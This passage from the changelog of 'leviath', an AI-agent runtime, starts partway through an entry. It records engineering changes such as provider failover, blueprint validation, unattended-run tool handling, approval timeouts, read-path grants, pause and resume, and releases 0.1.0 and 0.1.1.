  arrive under an innocent status (Anthropic reports a drained balance as a
  `400` saying the credit balance is too low). The message says what to do about
  it and keeps the provider's response for the logs.
- A stage now fails over instead of failing. Its ordered `models` list was only
  ever consulted once, at spawn, to pick the first provider with a key; a
  provider that was configured but unusable was chosen and then never abandoned.
  The rest of the list is kept and used. An ordinary error still cannot spend a
  fallback, and a stage that exhausts its list ends as before, with a readable
  message.
- New `[providers] fallback_order`, a host-wide list of `provider/model` pairs
  tried after a stage's own entries and the default model. A blueprint that
  names a single model has nowhere to go without it. It is per-run policy, so it
  reloads with no daemon restart.
- Providers that keep failing are taken out of service. Failing over rescues one
  run; the next one would start on the same dead provider and rediscover it.
  After `[limits] provider_failures_before_open` consecutive failures (default
  3, since a single payment error can be one oversized request) no run is
  dispatched there. `provider_circuit_cooldown_secs` (default 300) later lets
  one request through as a probe, so topping up an account brings the factory
  back with no restart. Runs with no candidate left are failed with an
  explanation rather than left running forever.
- `lev ps` names any provider currently out of service, with the reason and the
  retry countdown; `lev ps --json` carries it under `health.providers_down`. New
  `leviath.provider.circuit.open` and `leviath.provider.circuit.opened.total`
  metrics report the same per provider. Ten runs dying in a row used to produce
  ten identical error rows and nothing that said the account was empty.
- Anthropic and Ollama now classify HTTP failures through the same shared path
  as every other provider. Both had hand-rolled copies; a side effect was that
  `list_models` reported a rejected API key as a request failure, which reads as
  a transient network fault worth retrying. Ollama also gains the `429` handling
  it never had.
- `lev validate` now checks the things a blueprint leaves unsaid, not just the
  ones it gets wrong. A stage with no `[stages.X.model]` block parsed fine and
  then ran on whatever the user's `default_provider` was; an agent-level
  `[model]` block was read by nothing at all; a typo in `available_tools`
  matched nothing, so the stage quietly advertised one tool fewer and the model
  was told the tool did not exist. Each of those was invisible on inspection and
  turned up hours later as a run behaving oddly. There are thirteen checks in
  all, each with a stable code and a suggested fix.
- Typos are errors and exit non-zero; everything else is a warning that does
  not, or a note that never can. `lev validate --deny-warnings` makes warnings
  fatal for CI.
- The same findings are logged when the daemon spawns a run, so a blueprint
  nobody validated still says what is wrong with it in `daemon.log`. No finding
  refuses a spawn.
- `lev validate` also warns when an autonomous stage grants `ask_user_text`,
  `present_for_review` or another tool that suspends until a person answers.
  Unattended, the run parks there until it is killed. New stage key
  `allow_blocking_tools = true` records that the stage means it; it grants
  nothing and changes no behaviour.
- The lint found two defects in the shipped blueprints. `parallel-fixer` set
  `bash = "ask"` while every stage granted `shell`: policy is matched on the
  name the model calls, so the entry was never consulted. And
  `software-engineer`'s review stage had no `max_iterations`.
- `POST /api/blueprints/validate` returns a `warnings` list alongside `errors`.
- An unattended run no longer gets the tools that wait on a person.
  `ask_user_text`, `ask_user_choice`, `ask_user_confirm`, `present_for_review`,
  and `edit_document` do one thing: open a prompt and block. Under `--yolo`
  nobody answers, so a call to one used to park the agent in `WaitingInput`
  until the daemon restarted; six production runs sat there for three to five
  hours each, holding their slots. They are now dropped from the tool set the
  model is offered, per stage, before the first inference. The model never sees
  them and decides for itself instead of spending a round trip to be told nobody
  is there.
- A stage that genuinely needs a person opts out with `required_tools`, listing
  the human tools it keeps even when the run is unattended. Entries must also
  appear in `available_tools`, and a manifest where one does not is rejected
  rather than quietly ignored.
- Interaction points gained the same escape hatch. `unattended = "ask"` on a
  point holds the run for a real answer under `--yolo` instead of approving
  itself. The bundled `software-engineer` uses it for plan approval: everything
  after that gate writes code, so waving it through unread is the one thing that
  agent should not do on its own.
- New `[limits] interaction_timeout_secs`, one hour by default, puts a deadline
  on any prompt that waits on a person: `ask_user_*`, tool approvals, taint
  gates, and interaction points alike. There had never been one. Expiry resolves
  the prompt exactly as cancelling it does, so an approval and a taint gate both
  deny, the model is told no answer came, and a checkpoint proceeds with no user
  text. A timeout is never read as consent. Set it to `0` to wait indefinitely.
- `lev validate`'s `blocking-tool-in-autonomous-stage` warning now takes
  `required_tools` as the answer it is asking for. Keeping a tool says the same
  thing `allow_blocking_tools` says, one tool at a time, and says it about the
  run as well as the manifest.
- A blueprint's `[read_paths]` declaration now says whether your config
  actually grants it. Declaring a path outside the workdir has never been the
  same as being allowed to read it, but nothing said so: `lev validate` printed
  "valid", `lev list` printed the agent, the run spawned, and the first read
  outside the workdir was refused with no earlier sign that a config grant was
  the missing piece. That was fine on the machine whose config happened to have
  the grants and a mystery on every other one. `lev validate` now checks each
  declared entry against your `config.toml`, names the ones nothing grants, and
  prints the `[agent_read_paths.<agent>]` block that would fix it. `lev run`
  repeats that warning where the person running the agent can see it, rather
  than only in the daemon's log. `lev list` shows the counts per agent, `lev ps`
  grows a `READS` column reading granted over declared (and only when some run
  declares any), and `lev add` reports the status of what it just installed.
  The check compares patterns rather than touching the filesystem, so a grant
  naming a directory that does not exist yet still counts; an individual read is
  still matched against the real, symlink-resolved path when it happens.
- A run is no longer reported as having produced nothing when it never had a
  way to produce anything. `empty_output` in `meta.json` has meant "modified no
  files" since it was added for coding agents, so a router that delegates to
  sub-agents, or an agent whose answer is its text, was flagged on every
  successful run. Blueprints that advertise no file-modifying tool at any stage
  are now exempt, matching the escape a transition gate already makes for a
  stage that could never satisfy it. Agents that can write are judged exactly as
  before, `shell` included: edits made with `sed -i` still leave no record, and
  a run that made only those is still reported.
- That verdict is now visible. `lev ps` reads `complete (no output)`, the
  completion webhook carries an `empty_output` key, and the flag rides in
  `lev ps --json`. It had been written to disk and read back only on restart, so
  a run that finished with nothing to show for it looked exactly like one that
  worked.
- New `leviath.runs.total` metric, counting finished runs by terminal status and
  by whether they produced output, so the empty-run rate can be charted and
  alerted on.
- `lev ps` says why a run is waiting. `waiting` was one word for six unrelated
  situations, so an operator could not tell a run stopped on an approval prompt
  from a parent parked while its workers churn. It now reads
  `waiting: tool approval` or `waiting: children(3)`, alongside stage,
  iteration, tool-call, and age columns. `lev ps --help` defines every status
  and reason, and `lev ps --json` prints the raw listing for scripts.
- The `AGE` column measures time since the run last actually moved, which
  `meta.json`'s `updated_at` does not: that also advances on a 30-second
  heartbeat, so it stays fresh on a wedged run.
- `--yolo` now applies to the whole run tree. Sub-agents and fan-out workers
  inherit it instead of being spawned attended, so a child can no longer stop on
  a prompt nobody is watching for and strand the parent waiting on it.
- `--yolo` also survives a daemon restart, persisted as `yolo` in `meta.json`.
  It used to be dropped on reload on the grounds that forgetting an override can
  only prompt more; in practice that turned a running unattended job into one
  parked forever. Runs written by older versions default to attended. A
  configured `deny` still beats `--yolo`, and `ask_user_choice` still refuses to
  answer blind.
- A stage holding for its sub-agents could be walked back to `active` while
  those children were still running, if an unrelated prompt of its own resolved.
- Fixed a slot leak that could park the daemon with capacity it could not see.
  Releasing an inference-pool permit now wakes the tick loop, so the agents
  queued on a full model pool are re-driven and can take the freed slot. A
  cancelled inference used to hand its slot back in silence, and the loop is
  event-driven, so the freed capacity stayed invisible until something
  unrelated happened to wake it.
- The daemon now re-drives itself on a timer (every 30s) instead of relying
  solely on wakeups. Any missed wake anywhere is bounded to one interval rather
  than parking the daemon indefinitely - previously an agent whose provider was
  not registered, for example, sat at iteration 0 with the daemon completely
  idle and silent.
- Added a lane heartbeat so pool pressure is visible: per-model inference
  occupancy, tool-lane busy/queued counts, and agents by status. It logs at
  `info` only when a lane is at capacity with work queued behind it, and at
  `debug` otherwise, so an idle daemon stays quiet.
- Fixed runs that were spawned but never executed: they sat at iteration 0 with
  no tokens, reported as `running` for ever. A `lev run` whose stages have no
  configured provider is now refused outright, naming the stage and every
  provider it tried, instead of starting a run that could never take a turn.
- A spawn that fails now records the failure in the run directory it staked
  out, rather than leaving a `starting` placeholder that claimed the run was
  alive for ever.
- A run that ends up unable to dispatch anyway - a provider removed from the
  config after it started, say - is now failed once its stall outlives
  `[limits] stall_timeout_secs` (default 60 seconds; `0` waits indefinitely, as
  before). Waiting for a busy model's inference pool is never failed: that is
  ordinary backpressure, however long it lasts.
- An async lane task that dies without reporting (a provider adapter that
  panics) no longer strands its agent waiting for a completion that can never
  arrive; it surfaces as an ordinary inference, routing, or compaction error.
- Pause and resume are now user-facing: `lev pause <run-id>` and
  `lev resume <run-id>`, `POST /api/agents/{id}/pause` and `/resume` on the
  HTTP API, and `p`/`r` in the dashboard. A paused run shows as `paused` in
  `lev ps`, the dashboard, and the API, and comes back still paused after a
  daemon restart.
- Pausing a run that is waiting on input (or already finished) is now refused
  instead of silently accepted; the old behavior could wedge a fan-out parent
  by overwriting the status its merge poll depends on.
- Note for downgraders: run metadata written while a run is paused uses the
  new `paused` status, which older `lev` binaries cannot read. Resume or
  cancel paused runs before downgrading.
- Tool calls are now validated against the JSON Schema each tool advertises
  before they run. A call with missing, mistyped, or out-of-range arguments is
  refused back to the model with the concrete violations instead of executing
  on garbage or surfacing as a permission prompt. A schema that cannot be
  compiled (a typo'd Rhai `@param` type, an uninterpretable MCP fragment)
  skips validation for that tool with a logged warning, and external `$ref`s
  never resolve over the network.
- Taint-gate `[blocked]` results no longer count as successful modifications,
  so a stage whose writes were all blocked cannot satisfy a
  `require_modifications` transition gate.
- `send_to_agent`'s documented `target_region` argument now works: it was
  silently dropped on the sub-agent path and every message landed in the
  conversation region.
- Removed the unused message priority field; inbox delivery was always
  first-in, first-out in practice and now is by contract.
- Agents can be granted read access outside their working directory with a
  `[read_paths]` block. The declaration is inert on its own: your config must
  grant it via `[security] read_paths` or `[agent_read_paths.<agent>]`, access
  is read-only, and every path is checked after resolving symlinks.
- The daemon now watches `config.toml` and reloads it when it changes, so a
  permission, grant, sandbox, limit, or taint edit applies to the next
  `lev run` with no restart. A half-written file leaves the last good config in
  place. Boot-time wiring (providers, MCP, telemetry) still needs a restart.
- Inference errors and iteration caps are written into the next stage's
  context instead of only the logs, preferring a pinned `error_report` region
  when the blueprint declares one, so a recovery stage no longer has to
  rediscover what went wrong.
- The empty-response nudge is now configurable per stage, per agent, and
  machine-wide through `[nudge]` (`enabled`, `max`, `text`, with `{stage}` and
  `{regions}` placeholders). A stage whose deliverable is prose can turn it off
  rather than being told to use tools it does not have.
- Tool batches are journaled at dispatch and each call as it completes, so a
  daemon that dies mid-batch replays the results it already has instead of
  re-running the calls. Anything that never finished comes back as an
  interrupted result the model is told to verify first.
- Completion webhooks now carry a stable delivery id, so a receiver can
  deduplicate retries of the same delivery.
- Releases are cut by a version bump rather than by a schedule. Alpha now
  publishes as soon as a commit bumping `[workspace.package] version` lands on
  `main`, and beta and stable promote it on their usual weekly cadence; a
  channel with nothing new finishes in seconds having published nothing. That
  ends the nightly churn of rebuilding identical source and re-promoting an
  already-promoted build, and with it the `vX.Y.Z+date` tags that existed only
  to avoid colliding with a version already released.

## 0.1.1 - 2026-07-31

Post-launch cleanup.

- The daemon's launchd service label is now `dev.leviath.daemon`;
  `lev daemon install`/`uninstall` also remove any registration under the old
  `ai.sunforge.leviath` label, so upgrading cannot leave a stale supervised
  daemon behind.
- The `lev run` error hint shows a working invocation.
- Removed the outdated per-agent READMEs bundled with the CLI (the
  [agent catalog](https://leviath.dev/docs/agent-catalog) is the maintained
  reference); improved the crates.io pages with inline install steps and a
  runnable library example.
- crates.io releases are now published automatically from each stable deploy,
  from the same commit the binaries are built at.

## 0.1.0 - 2026-07-31

First public release.

- The `lev` binary: run multi-stage agents in a shared-world daemon, with a
  TUI dashboard, REST + WebSocket API, Agent Client Protocol support, and MCP
  tool servers.
- Ten bundled agent blueprints installed by `lev setup`.
- The `leviath` library crate: the whole runtime behind one dependency, with
  `leviath-core`, `leviath-runtime`, and the other layer crates published
  individually for slimmer builds.
- Structured context regions with token budgets, sandboxed tool execution,
  experimental taint tracking, Rhai scripting for providers, tools, regions,
  and policy rules, and OpenTelemetry export.
